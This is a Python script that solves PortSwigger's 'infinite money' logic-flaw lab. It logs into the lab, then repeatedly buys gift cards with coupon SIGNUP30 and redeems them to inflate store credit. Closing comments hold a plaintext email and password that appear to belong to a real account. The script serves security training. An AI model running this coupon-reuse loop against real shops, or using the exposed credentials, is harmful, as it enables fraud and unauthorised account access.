import requests
from bs4 import BeautifulSoup
from datetime import datetime

Store_values_1 = 0
Store_values_2 = 1
Store_values_3 = 2
Store_values_4 = 4

def logen (EmailAddress, Password):
        EmailAddress = input ('Enter your Email address : ')
        Password = input ('Enter your Password : ')
        return EmailAddress, Password
              
def URL(soup,response):
        response = requests.get('https://portswigger.net/users')
        soup = BeautifulSoup(response.content, 'lxml')
        return soup,response

def R_V_Token_and_SessionId(SessionId,R_V_Token):
        soup_response = URL(Store_values_1,Store_values_2)
        soup = soup_response[0]
        response = soup_response[1]
        Request_Verification_Token = soup.find("input", {"id":"RequestVerificationToken"})
        R_V_Token = Request_Verification_Token.attrs['value']
        SessionId = response.cookies['SessionId']
        return SessionId,R_V_Token  

def A_U_V_and_SessionId(SessionId_V1,A_U_V):
        Email_Pass = logen (Store_values_1, Store_values_2)
        EmailAddress = Email_Pass[0]
        Password = Email_Pass[1]
        SessionId_R_V_Token = R_V_Token_and_SessionId (Store_values_3,Store_values_4)
        SessionId = SessionId_R_V_Token[0]
        R_V_Token = SessionId_R_V_Token[1]

        cookies = {
        'SessionId': f'{SessionId}',
    }
        headers = {
        'authority': 'portswigger.net',
        'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryBp9BchMP4T6OcR6y',
        'origin': 'https://portswigger.net',
    }
        data = '------WebKitFormBoundaryBp9BchMP4T6OcR6y\r\nContent-Disposition: form-data; name="RequestVerificationToken"\r\n\r\n'f'{R_V_Token}''\r\n------WebKitFormBoundaryBp9BchMP4T6OcR6y\r\nContent-Disposition: form-data; name="EmailAddress"\r\n\r\n'f'{EmailAddress}''\r\n------WebKitFormBoundaryBp9BchMP4T6OcR6y\r\nContent-Disposition: form-data; name="Password"\r\n\r\n'f'{Password}''\r\n------WebKitFormBoundaryBp9BchMP4T6OcR6y\r\nContent-Disposition: form-data; name="RememberMe"\r\n\r\nfalse\r\n------WebKitFormBoundaryBp9BchMP4T6OcR6y\r\nContent-Disposition: form-data; name="ajaxRequest"\r\n\r\ntrue\r\n------WebKitFormBoundaryBp9BchMP4T6OcR6y--\r\n'
        Login = 'https://portswigger.net/users'
        response = requests.post(Login, cookies=cookies, headers=headers, data=data)
        SessionId_V1 = response.headers["set-cookie"]
        SessionId_V1 = SessionId_V1.rstrip()
        SessionId_V1 = SessionId_V1.replace(';','')
        SessionId_V1 = SessionId_V1.replace(' max-age','')
        SessionId_V1 = SessionId_V1.split('=') 
        SessionId_V1 = SessionId_V1[1]
        A_U_V = response.headers["set-cookie"]
        A_U_V = A_U_V.rstrip()
        A_U_V = A_U_V.replace(';','')
        A_U_V = A_U_V.replace(' expires','')
        A_U_V = A_U_V.split('=')
        A_U_V = A_U_V[6]
        return SessionId_V1,A_U_V
    
def LAB_link(link_to_lab):
        response = requests.get('https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money')
        soup = BeautifulSoup(response.content, 'lxml')
        ACCESS_THE_LAB_link_V1 = soup.find_all('a', {'class': 'button-orange'})
        for link in ACCESS_THE_LAB_link_V1:
            href = link['href']
            if href:
                link_to_lab = 'https://portswigger.net'f'{href}'
        return link_to_lab

def LAB__finel_link(LAB_money_url_final):
        SessionId_V1_A_U_V = A_U_V_and_SessionId (Store_values_1,Store_values_2)
        SessionId_V1 = SessionId_V1_A_U_V[0]
        A_U_V = SessionId_V1_A_U_V[1]
        link_to_lab = LAB_link(Store_values_3)
        cookies = {
        'SessionId': f'{SessionId_V1}',
        'Authenticated_UserVerificationId': f'{A_U_V}',
        }

        headers = {
        'authority': 'portswigger.net',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en,ar;q=0.9',
        'referer': 'https://portswigger.net',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36',
        }
        response = requests.get(link_to_lab,cookies=cookies,headers=headers)
        LAB_money_url_final = response.url
        return LAB_money_url_final
    
def Logen_to_lab(LAB_money_url_final,Session_finel,csrf_finel):
        LAB_money_url_final = LAB__finel_link(Store_values_1)
        URL = requests.get(f'{LAB_money_url_final}login')
        with URL as A:
            soup = BeautifulSoup(A.content, 'lxml')
            SessionId_V2 = A.cookies['session']
            csrf_V2 = soup.find("input", {"name":"csrf"})
            csrf_V2 = csrf_V2.attrs['value']
            cookies = {'session': f'{SessionId_V2}'}
            data = {'csrf' : f'{csrf_V2}', 'username': 'wiener', 'password':'peter'} 
            response = requests.post(f'{LAB_money_url_final}login',cookies=cookies,data=data)
            soup = BeautifulSoup(response.content, 'lxml')
            csrf_finel = soup.find("input", {"name":"csrf"})
            Session_finel = response.history[0].cookies['session']
            csrf_finel = csrf_finel.attrs['value']

        return LAB_money_url_final,Session_finel,csrf_finel
    
def LAB_S_C(LAB_money_url_Session_csrf):
    
    LAB_money_url_Session_csrf= Logen_to_lab(Store_values_1,Store_values_2,Store_values_3)
    return LAB_money_url_Session_csrf

def main (): 
    Store_values_1 = 0

    LAB_M_Ses_finel_c_finel_V = LAB_S_C(Store_values_1)
    URL_LAB = LAB_M_Ses_finel_c_finel_V[0]
    session_to_logen = LAB_M_Ses_finel_c_finel_V[1]
    csrf_to_logen = LAB_M_Ses_finel_c_finel_V[2]

    print(f"You can register in the lab by going to '{URL_LAB}' and replacing \nSession in the cookie with'{session_to_logen}' or going to my account and use credentials: wiener : peter")
    def money():
        Store_values_2 = 0
        Store_values_3 = 0
        Store_credit = input ('How much money do you want in your Store credit : ')
        Store_credit = int(Store_credit)
        MONEY = 100
        def Check_money(Store_credit_all):
                cookies = {'session': f'{session_to_logen}'}
                response = requests.get(f"{URL_LAB}my-account",cookies=cookies)
                soup2 = BeautifulSoup(response.content, 'lxml')
                Store_credit = soup2.find("strong").text
                Store_credit = Store_credit.replace('Store credit: $','')
                Store_credit_all = Store_credit.replace('.00','')
                return Store_credit_all
        
        while ( Store_credit >= MONEY):
                start = datetime.now()

                MONEY = Check_money(Store_values_1)
                MONEY = int(MONEY)

                def cart():
                        cookies = {'session': f'{session_to_logen}'}
                        data = {'productId' : '2', 'redir': 'PRODUCT', 'quantity':'1'} 
                        response = requests.post(f"{URL_LAB}cart",cookies=cookies,data=data)
                cart()

                def coupon():
                        cookies = {'session': f'{session_to_logen}'}
                        data = {'csrf' : f'{csrf_to_logen}' ,'coupon' : 'SIGNUP30' } 
                        response = requests.post(f"{URL_LAB}cart/coupon",cookies=cookies,data=data)
                coupon()

                def checkout(Code_v):
                        cookies = {'session': f'{session_to_logen}'}
                        data = {'csrf' : f'{csrf_to_logen}'  } 
                        response = requests.post(f"{URL_LAB}cart/checkout",cookies=cookies,data=data)
                        soup2 = BeautifulSoup(response.content, 'lxml')
                        Code = soup2.find("table", {"class":"is-table-numbers"})
                        Code_v = Code.find("td").text.strip() 
                        return Code_v

                def get_Code():
                        Code = checkout(Store_values_1)
                        cookies = {'session': f'{session_to_logen}'}
                        data = {'csrf' : f'{csrf_to_logen}' ,'gift-card' : Code } 
                        response = requests.post(f"{URL_LAB}gift-card",cookies=cookies,data=data)
                get_Code()
                end = datetime.now()

                execution_to_seconds = (end - start).total_seconds() * 10**3/1000
                Store_values_3 = Store_values_3 + execution_to_seconds
                Store_values_2 = Store_values_2 + 1
                print("Store credit now is "f"{MONEY}"" $ execution time " f"{execution_to_seconds:.02f}"" S and Runtime "f"{Store_values_2}""")

        else:
                print("your Store credit now is : ",MONEY + 3)
                if Store_values_3 <= 60 :
                        print("Total execution time "f"{Store_values_3:.02f}"" S and total Runtime "f"{Store_values_2 + 1}""")
                elif Store_values_3/60 <= 60 :
                        Store_values_3= Store_values_3/60 
                        print("Total execution time "f"{Store_values_3:.02f}"" M and total Runtime "f"{Store_values_2 + 1}""")
                
                else: print("Total execution time "f"{Store_values_3:.02f}"" H and total Runtime "f"{Store_values_2 + 1}""")

    money()

main()
#EmailAddress = 'shift_shadow@yopmail.com'
#Password = '3*B}k|_8Bw[/a&;r8=HS-A;/2c65m{3E'
#coupon : SIGNUP30